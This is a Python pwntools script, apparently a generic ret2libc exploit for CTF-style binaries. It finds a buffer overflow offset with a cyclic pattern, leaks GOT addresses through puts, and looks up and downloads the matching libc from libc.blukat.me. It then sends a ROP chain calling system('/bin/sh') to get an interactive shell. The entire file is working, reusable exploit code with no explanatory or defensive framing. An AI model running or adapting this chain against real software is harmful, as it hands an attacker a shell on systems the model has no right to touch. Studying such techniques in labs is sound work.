from pwn import *
import requests
from bs4 import BeautifulSoup
import os
import shutil

#context.log_level = 'debug'
class Exploit:
	def __init__(self):
		self.elf = ELF("./tests/ret")
		self.offset_leaking = self.elf.process()
		self.rop = ROP(self.elf)
		self.url_find_libc = "https://libc.blukat.me/?q="
		self.url_download_libc = "https://libc.blukat.me/d/"
		os.path.join(os.getcwd(), "libc")
		#script = """
		#b *0x00000000004006e7
		#"""
		#self.p = self.elf.debug(gdbscript=script)
		self.p = self.elf.process()
		context.arch = 'amd64'

	def recovery(self, instance, message, *args, exception=Exception, callback=lambda: None):
		try:
			instance.call(*args)
		except exception:
			log.warning(message)
			callback()

	def offset_finder(self, offset_leaking):
		offset_leaking = offset_leaking
		offset = b""
		if offset == b"":
			log.info("Searching for offset")
			self.offset_leaking.sendline(cyclic(516,n=8))
			self.offset_leaking.wait()
			core = Coredump('./core')
			offset = cyclic_find(core.read(core.rsp,8),n=8)
			log.info(f"Offset is {offset}")
		return offset

	def payload_generator(self, instance, offset):
		payload = [
			b"A"*offset,
			instance.chain()
		]
		payload = b"".join(payload)
		return payload

	def join_cwd(self, path):
		return os.path.join(os.getcwd(), path)

	def main(self):
		offset = self.offset_finder(self.offset_leaking)
		self.p.recv()
		log.info("Leaking available address...")
		available_funcs = tuple(name for name in self.elf.got.keys() if name in ['puts', 'gets', 'printf', 'read', '__libc_start_main'])
		for func in available_funcs:
			self.recovery(self.rop,f"No {func} in GOT", self.elf.symbols["puts"], [self.elf.got[func]])
		self.recovery(self.rop,f"No main found...", self.elf.symbols["main"])
		payload1 = self.payload_generator(self.rop,offset)
		self.p.sendline(payload1)
		leaked_addr_list = []
		for name in available_funcs: 
			leaked = u64(self.p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
			log.info(f"{name} @ {hex(leaked)}")
			name_leaked = name+":"+hex(leaked)
			leaked_addr_list.append(name_leaked)
		log.info("Looking for a libc...")
		leaked_addr = ",".join(leaked_addr_list)
		page = requests.get(self.url_find_libc+leaked_addr)
		soup = BeautifulSoup(page.content,"html.parser")
		scrap = soup.find(class_="lib-item")
		libc_found = "".join(scrap.text.split()) + ".so"
		log.info("Found a LIBC that could work (found it on https://libc.blukat.me/).")
		log.info("Testing with following LIBC: " + libc_found)
		
		if libc_found != "":
			if (libc_found) not in os.listdir('./libc/'):
				log.info("Downloading libc... Could take some time depending of your internet")
				req = requests.get(self.url_download_libc+libc_found, allow_redirects=True)
				open(libc_found,'wb').write(req.content)
				LIBC = "./libc/" + str(libc_found)
				src = self.join_cwd(libc_found)
				to = self.join_cwd(os.path.join("libc", libc_found))
				shutil.move(src, to)
			else:
				log.info('LIBC already downloaded previously')
				LIBC = "./libc/" + str(libc_found)
			if LIBC:
				libc = ELF(LIBC) 
				libc.address = leaked - libc.symbols[available_funcs[-1]]
				log.info(f"base libc {hex(libc.address)}")
		else:
			log.warning("Couldn't find LIBC... Aborting.")
			exit(-1)

		roplibc = ROP(libc)
		self.recovery(roplibc, "Couldn't find ret", roplibc.find_gadget(["ret"]))
		self.recovery(roplibc, "Didn't found system...","system",[ next(libc.search(b"/bin/sh\x00")) ])
		self.recovery(roplibc,"Didn't found exit...","exit")

		payload2 = self.payload_generator(roplibc, offset)

		self.p.sendline(payload2)
		self.p.interactive()

exploit = Exploit()
exploit.main()
